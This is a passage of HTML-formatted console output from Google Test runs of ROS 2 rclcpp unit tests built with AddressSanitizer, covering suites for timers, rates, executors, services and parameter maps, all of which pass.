    <span id="cb150-272"><a href="#cb150-272" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-273"><a href="#cb150-273" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 4 tests from 1 test case.</span>
    <span id="cb150-274"><a href="#cb150-274" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-275"><a href="#cb150-275" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestUtilities</span>
    <span id="cb150-276"><a href="#cb150-276" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestUtilities.remove_ros_arguments</span></span>
    <span id="cb150-277"><a href="#cb150-277" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestUtilities.remove_ros_arguments</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-278"><a href="#cb150-278" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestUtilities.remove_ros_arguments_null</span></span>
    <span id="cb150-279"><a href="#cb150-279" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestUtilities.remove_ros_arguments_null</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
    <span id="cb150-280"><a href="#cb150-280" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestUtilities.init_with_args</span></span>
    <span id="cb150-281"><a href="#cb150-281" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestUtilities.init_with_args</span> <span class="er">(</span><span class="ex">21</span> ms<span class="kw">)</span></span>
    <span id="cb150-282"><a href="#cb150-282" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestUtilities.multi_init</span></span>
    <span id="cb150-283"><a href="#cb150-283" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestUtilities.multi_init</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
    <span id="cb150-284"><a href="#cb150-284" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestUtilities <span class="er">(</span><span class="ex">30</span> ms total<span class="kw">)</span></span>
    <span id="cb150-285"><a href="#cb150-285" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-286"><a href="#cb150-286" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-287"><a href="#cb150-287" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 4 tests from 1 test case ran. <span class="er">(</span><span class="ex">33</span> ms total<span class="kw">)</span></span>
    <span id="cb150-288"><a href="#cb150-288" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">4</span> tests.</span>
    <span id="cb150-289"><a href="#cb150-289" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-290"><a href="#cb150-290" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-291"><a href="#cb150-291" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-292"><a href="#cb150-292" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestFindWeakNodes</span>
    <span id="cb150-293"><a href="#cb150-293" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFindWeakNodes.allocator_strategy_with_weak_nodes</span></span>
    <span id="cb150-294"><a href="#cb150-294" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFindWeakNodes.allocator_strategy_with_weak_nodes</span> <span class="er">(</span><span class="ex">127</span> ms<span class="kw">)</span></span>
    <span id="cb150-295"><a href="#cb150-295" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFindWeakNodes.allocator_strategy_no_weak_nodes</span></span>
    <span id="cb150-296"><a href="#cb150-296" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFindWeakNodes.allocator_strategy_no_weak_nodes</span> <span class="er">(</span><span class="ex">72</span> ms<span class="kw">)</span></span>
    <span id="cb150-297"><a href="#cb150-297" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestFindWeakNodes <span class="er">(</span><span class="ex">199</span> ms total<span class="kw">)</span></span>
    <span id="cb150-298"><a href="#cb150-298" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-299"><a href="#cb150-299" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-300"><a href="#cb150-300" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">222</span> ms total<span class="kw">)</span></span>
    <span id="cb150-301"><a href="#cb150-301" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-302"><a href="#cb150-302" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-303"><a href="#cb150-303" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 2 test cases.</span>
    <span id="cb150-304"><a href="#cb150-304" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-305"><a href="#cb150-305" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestService</span>
    <span id="cb150-306"><a href="#cb150-306" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestService.construction_and_destruction</span></span>
    <span id="cb150-307"><a href="#cb150-307" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestService.construction_and_destruction</span> <span class="er">(</span><span class="ex">70</span> ms<span class="kw">)</span></span>
    <span id="cb150-308"><a href="#cb150-308" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestService <span class="er">(</span><span class="ex">70</span> ms total<span class="kw">)</span></span>
    <span id="cb150-309"><a href="#cb150-309" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-310"><a href="#cb150-310" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestServiceSub</span>
    <span id="cb150-311"><a href="#cb150-311" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestServiceSub.construction_and_destruction</span></span>
    <span id="cb150-312"><a href="#cb150-312" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestServiceSub.construction_and_destruction</span> <span class="er">(</span><span class="ex">30</span> ms<span class="kw">)</span></span>
    <span id="cb150-313"><a href="#cb150-313" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestServiceSub <span class="er">(</span><span class="ex">31</span> ms total<span class="kw">)</span></span>
    <span id="cb150-314"><a href="#cb150-314" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-315"><a href="#cb150-315" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-316"><a href="#cb150-316" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 2 test cases ran. <span class="er">(</span><span class="ex">123</span> ms total<span class="kw">)</span></span>
    <span id="cb150-317"><a href="#cb150-317" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-318"><a href="#cb150-318" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-319"><a href="#cb150-319" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 4 tests from 1 test case.</span>
    <span id="cb150-320"><a href="#cb150-320" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-321"><a href="#cb150-321" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestWithDifferentNodeOptions/TestPublisherSubscriptionCount</span>
    <span id="cb150-322"><a href="#cb150-322" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_intraprocess_comm</span></span>
    <span id="cb150-323"><a href="#cb150-323" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_intraprocess_comm</span> <span class="er">(</span><span class="ex">8152</span> ms<span class="kw">)</span></span>
    <span id="cb150-324"><a href="#cb150-324" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_one_intraprocess_one_not</span></span>
    <span id="cb150-325"><a href="#cb150-325" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_one_intraprocess_one_not</span> <span class="er">(</span><span class="ex">8140</span> ms<span class="kw">)</span></span>
    <span id="cb150-326"><a href="#cb150-326" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_in_two_contexts_with_intraprocess_comm</span></span>
    <span id="cb150-327"><a href="#cb150-327" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_in_two_contexts_with_intraprocess_comm</span> <span class="er">(</span><span class="ex">8116</span> ms<span class="kw">)</span></span>
    <span id="cb150-328"><a href="#cb150-328" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_in_two_contexts_without_intraprocess_comm</span></span>
    <span id="cb150-329"><a href="#cb150-329" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestPublisherSubscriptionCount.increasing_and_decreasing_counts/two_subscriptions_in_two_contexts_without_intraprocess_comm</span> <span class="er">(</span><span class="ex">8105</span> ms<span class="kw">)</span></span>
    <span id="cb150-330"><a href="#cb150-330" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestWithDifferentNodeOptions/TestPublisherSubscriptionCount <span class="er">(</span><span class="ex">32513</span> ms total<span class="kw">)</span></span>
    <span id="cb150-331"><a href="#cb150-331" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-332"><a href="#cb150-332" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-333"><a href="#cb150-333" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 4 tests from 1 test case ran. <span class="er">(</span><span class="ex">32514</span> ms total<span class="kw">)</span></span>
    <span id="cb150-334"><a href="#cb150-334" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">4</span> tests.</span>
    <span id="cb150-335"><a href="#cb150-335" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-336"><a href="#cb150-336" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-337"><a href="#cb150-337" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-338"><a href="#cb150-338" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestSerializedMessageAllocator</span>
    <span id="cb150-339"><a href="#cb150-339" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSerializedMessageAllocator.default_allocator</span></span>
    <span id="cb150-340"><a href="#cb150-340" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSerializedMessageAllocator.default_allocator</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-341"><a href="#cb150-341" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestSerializedMessageAllocator.borrow_from_subscription</span></span>
    <span id="cb150-342"><a href="#cb150-342" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestSerializedMessageAllocator.borrow_from_subscription</span> <span class="er">(</span><span class="ex">112</span> ms<span class="kw">)</span></span>
    <span id="cb150-343"><a href="#cb150-343" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestSerializedMessageAllocator <span class="er">(</span><span class="ex">114</span> ms total<span class="kw">)</span></span>
    <span id="cb150-344"><a href="#cb150-344" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-345"><a href="#cb150-345" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-346"><a href="#cb150-346" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">114</span> ms total<span class="kw">)</span></span>
    <span id="cb150-347"><a href="#cb150-347" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-348"><a href="#cb150-348" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-349"><a href="#cb150-349" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 4 tests from 1 test case.</span>
    <span id="cb150-350"><a href="#cb150-350" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-351"><a href="#cb150-351" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestTimer</span>
    <span id="cb150-352"><a href="#cb150-352" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimer.test_simple_cancel</span></span>
    <span id="cb150-353"><a href="#cb150-353" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimer.test_simple_cancel</span> <span class="er">(</span><span class="ex">90</span> ms<span class="kw">)</span></span>
    <span id="cb150-354"><a href="#cb150-354" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimer.test_is_canceled_reset</span></span>
    <span id="cb150-355"><a href="#cb150-355" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimer.test_is_canceled_reset</span> <span class="er">(</span><span class="ex">34</span> ms<span class="kw">)</span></span>
    <span id="cb150-356"><a href="#cb150-356" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimer.test_run_cancel_executor</span></span>
    <span id="cb150-357"><a href="#cb150-357" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimer.test_run_cancel_executor</span> <span class="er">(</span><span class="ex">135</span> ms<span class="kw">)</span></span>
    <span id="cb150-358"><a href="#cb150-358" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTimer.test_run_cancel_timer</span></span>
    <span id="cb150-359"><a href="#cb150-359" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTimer.test_run_cancel_timer</span> <span class="er">(</span><span class="ex">135</span> ms<span class="kw">)</span></span>
    <span id="cb150-360"><a href="#cb150-360" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestTimer <span class="er">(</span><span class="ex">394</span> ms total<span class="kw">)</span></span>
    <span id="cb150-361"><a href="#cb150-361" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-362"><a href="#cb150-362" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-363"><a href="#cb150-363" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 4 tests from 1 test case ran. <span class="er">(</span><span class="ex">394</span> ms total<span class="kw">)</span></span>
    <span id="cb150-364"><a href="#cb150-364" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">4</span> tests.</span>
    <span id="cb150-365"><a href="#cb150-365" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-366"><a href="#cb150-366" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-367"><a href="#cb150-367" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-368"><a href="#cb150-368" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestRate</span>
    <span id="cb150-369"><a href="#cb150-369" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestRate.rate_basics</span></span>
    <span id="cb150-370"><a href="#cb150-370" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestRate.rate_basics</span> <span class="er">(</span><span class="ex">504</span> ms<span class="kw">)</span></span>
    <span id="cb150-371"><a href="#cb150-371" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestRate.wall_rate_basics</span></span>
    <span id="cb150-372"><a href="#cb150-372" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestRate.wall_rate_basics</span> <span class="er">(</span><span class="ex">507</span> ms<span class="kw">)</span></span>
    <span id="cb150-373"><a href="#cb150-373" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestRate <span class="er">(</span><span class="ex">1011</span> ms total<span class="kw">)</span></span>
    <span id="cb150-374"><a href="#cb150-374" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-375"><a href="#cb150-375" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-376"><a href="#cb150-376" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">1011</span> ms total<span class="kw">)</span></span>
    <span id="cb150-377"><a href="#cb150-377" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-378"><a href="#cb150-378" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-379"><a href="#cb150-379" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-380"><a href="#cb150-380" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-381"><a href="#cb150-381" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestExecutors</span>
    <span id="cb150-382"><a href="#cb150-382" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExecutors.detachOnDestruction</span></span>
    <span id="cb150-383"><a href="#cb150-383" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExecutors.detachOnDestruction</span> <span class="er">(</span><span class="ex">66</span> ms<span class="kw">)</span></span>
    <span id="cb150-384"><a href="#cb150-384" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExecutors.addTemporaryNode</span></span>
    <span id="cb150-385"><a href="#cb150-385" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExecutors.addTemporaryNode</span> <span class="er">(</span><span class="ex">79</span> ms<span class="kw">)</span></span>
    <span id="cb150-386"><a href="#cb150-386" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestExecutors <span class="er">(</span><span class="ex">145</span> ms total<span class="kw">)</span></span>
    <span id="cb150-387"><a href="#cb150-387" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-388"><a href="#cb150-388" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-389"><a href="#cb150-389" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">168</span> ms total<span class="kw">)</span></span>
    <span id="cb150-390"><a href="#cb150-390" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-391"><a href="#cb150-391" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-392"><a href="#cb150-392" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 15 tests from 1 test case.</span>
    <span id="cb150-393"><a href="#cb150-393" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-394"><a href="#cb150-394" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 15 tests from Test_parameter_map_from</span>
    <span id="cb150-395"><a href="#cb150-395" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_c_parameter</span></span>
    <span id="cb150-396"><a href="#cb150-396" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_c_parameter</span> <span class="er">(</span><span class="ex">3</span> ms<span class="kw">)</span></span>
    <span id="cb150-397"><a href="#cb150-397" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_names</span></span>
    <span id="cb150-398"><a href="#cb150-398" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_names</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
    <span id="cb150-399"><a href="#cb150-399" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_params</span></span>
    <span id="cb150-400"><a href="#cb150-400" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_params</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-401"><a href="#cb150-401" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_name_in_node_names</span></span>
    <span id="cb150-402"><a href="#cb150-402" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_name_in_node_names</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-403"><a href="#cb150-403" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_param_value</span></span>
    <span id="cb150-404"><a href="#cb150-404" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_param_value</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
    <span id="cb150-405"><a href="#cb150-405" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_param_name</span></span>
    <span id="cb150-406"><a href="#cb150-406" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.null_node_param_name</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-407"><a href="#cb150-407" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.bool_param_value</span></span>
    <span id="cb150-408"><a href="#cb150-408" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.bool_param_value</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-409"><a href="#cb150-409" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.integer_param_value</span></span>
    <span id="cb150-410"><a href="#cb150-410" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.integer_param_value</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-411"><a href="#cb150-411" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.double_param_value</span></span>
    <span id="cb150-412"><a href="#cb150-412" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.double_param_value</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-413"><a href="#cb150-413" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.string_param_value</span></span>
    <span id="cb150-414"><a href="#cb150-414" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.string_param_value</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-415"><a href="#cb150-415" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.byte_array_param_value</span></span>
    <span id="cb150-416"><a href="#cb150-416" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.byte_array_param_value</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-417"><a href="#cb150-417" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.bool_array_param_value</span></span>
    <span id="cb150-418"><a href="#cb150-418" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.bool_array_param_value</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-419"><a href="#cb150-419" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Test_parameter_map_from.integer_array_param_value</span></span>
    <span id="cb150-420"><a href="#cb150-420" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Test_parameter_map_from.integer_array_param_value</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
